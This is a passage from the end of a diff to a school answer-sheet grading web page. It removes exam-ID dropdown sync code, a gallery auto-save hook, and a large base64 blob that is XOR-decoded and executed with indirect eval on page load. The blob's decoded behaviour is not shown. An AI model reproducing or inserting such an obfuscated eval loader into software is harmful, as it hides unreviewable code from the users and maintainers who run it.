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");
-  var _u=new Uint8Array(_d.length);
-  for(var i=0;i<_d.length;i++){_u[i]=_d.charCodeAt(i)^_k.charCodeAt(i%_k.length);}
-  var _s=new TextDecoder("utf-8").decode(_u);
-  (0,eval)(_s);
-
-  // Hook into grading completion so the checked answer sheet is auto-saved to Gallery
-  const origSaveGallery = window.saveToPhoneGallery;
-  if (typeof origSaveGallery === 'function') {
-    window.saveToPhoneGallery = function(showToast) {
-      origSaveGallery(showToast);
-      galleryAlreadySavedForCurrentSheet = true;
-    };
-  }
-})();
-</script>
-
-<!-- Dynamic Subject + Test Type -> Exam ID Generator & Two-Way Sync -->
-<script>
-  (function () {
-    const _coreSyncTosFromExamId = typeof window.syncTosFromExamId === 'function'
-      ? window.syncTosFromExamId
-      : null;
-
-    // Auto-generate & select Exam ID (e.g., ENG10-ST1) when Subject or Test Type changes
-    window.syncTosExamIdFromFields = function () {
-      const subjectSelect = document.getElementById('tosSubject');
-      const testTypeSelect = document.getElementById('tosTestType');
-      const examIdSelect = document.getElementById('tosExamId');
-      if (!subjectSelect || !testTypeSelect || !examIdSelect) return;
-
-      const selectedOption = subjectSelect.options[subjectSelect.selectedIndex];
-      const subjectCode = selectedOption ? (selectedOption.getAttribute('data-code') || '').trim() : '';
-      const testType = (testTypeSelect.value || '').trim();
-
-      if (!subjectCode || !testType) {
-        examIdSelect.value = '';
-        return;
-      }
-
-      const generatedExamId = `${subjectCode}-${testType}`;
-      const savedKeys = JSON.parse(localStorage.getItem('cpghs_omr_exam_keys') || '{}');
-
-      let existingOption = Array.from(examIdSelect.options).find(opt => opt.value === generatedExamId);
-      if (!existingOption) {
-        existingOption = document.createElement('option');
-        existingOption.value = generatedExamId;
-        existingOption.textContent = savedKeys[generatedExamId]
-          ? `${generatedExamId} (Key Saved ✓)`
-          : generatedExamId;
-        examIdSelect.appendChild(existingOption);
-      }
-
-      examIdSelect.value = generatedExamId;
-      localStorage.setItem('cpghs_last_selected_exam', generatedExamId);
-
-      if (_coreSyncTosFromExamId) {
-        _coreSyncTosFromExamId();
-      } else if (savedKeys[generatedExamId]) {
-        const keyField = document.getElementById('tosAnswerKey');
-        if (keyField && typeof savedKeys[generatedExamId] === 'string') {
-          keyField.value = savedKeys[generatedExamId];
-        } else if (keyField && savedKeys[generatedExamId].key) {
-          keyField.value = savedKeys[generatedExamId].key;
-        }
-      }
-    };
-
-    // Reverse-sync Subject & Test Type when selecting an Exam ID directly
-    window.syncTosFromExamId = function () {
-      const examIdSelect = document.getElementById('tosExamId');
-      const subjectSelect = document.getElementById('tosSubject');
-      const testTypeSelect = document.getElementById('tosTestType');
-      if (!examIdSelect || !subjectSelect || !testTypeSelect) return;
-
-      const examId = (examIdSelect.value || '').trim();
-      if (!examId) return;
-
-      localStorage.setItem('cpghs_last_selected_exam', examId);
-
-      const lastDashIndex = examId.lastIndexOf('-');
-      if (lastDashIndex > 0) {
-        const codePart = examId.substring(0, lastDashIndex);
-        const typePart = examId.substring(lastDashIndex + 1);
-
-        const matchingSubject = Array.from(subjectSelect.options).find(
-          opt => (opt.getAttribute('data-code') || '').trim() === codePart
-        );
-        if (matchingSubject) {
-          subjectSelect.value = matchingSubject.value;
-        }
-
-        const matchingType = Array.from(testTypeSelect.options).find(
-          opt => opt.value === typePart
-        );
-        if (matchingType) {
-          testTypeSelect.value = matchingType.value;
-        }
-      }
-
-      if (_coreSyncTosFromExamId) {
-        _coreSyncTosFromExamId();
-      }
-    };
-
-    // Populate all Exam ID dropdowns from all subjects in #tosSubject
-    window.restoreAllExamIdDropdowns = function () {
-      const savedKeys = JSON.parse(localStorage.getItem('cpghs_omr_exam_keys') || '{}');
-      const subjectSelect = document.getElementById('tosSubject');
-      const testTypes = ['ST1', 'ST2', 'TERM'];
-      const generatedDefaults = [];
-
-      if (subjectSelect) {
-        Array.from(subjectSelect.options).forEach(opt => {
-          const code = (opt.getAttribute('data-code') || '').trim();
-          if (code) {
-            testTypes.forEach(type => generatedDefaults.push(`${code}-${type}`));
-          }
-        });
-      }
-
-      const allIds = Array.from(new Set([...Object.keys(savedKeys), ...generatedDefaults]));
-      const dropdownIds = ['examSelect', 'analyticsExamSelect', 'tosExamId'];
-
-      dropdownIds.forEach(ddId => {
-        const sel = document.getElementById(ddId);
-        if (!sel) return;
-        const prevVal = sel.value || localStorage.getItem('cpghs_last_selected_exam') || '';
-        sel.innerHTML = '<option value="">-- Select Exam ID --</option>';
-
-        allIds.forEach(id => {
-          const opt = document.createElement('option');
-          opt.value = id;
-          opt.textContent = savedKeys[id] ? `${id} (Key Saved ✓)` : id;
-          sel.appendChild(opt);
-        });
-
-        if (prevVal && allIds.includes(prevVal)) {
-          sel.value = prevVal;
-        }
-      });
-    };
-
-    restoreAllExamIdDropdowns();
-  })();
 </script>
 </body>
 </html>
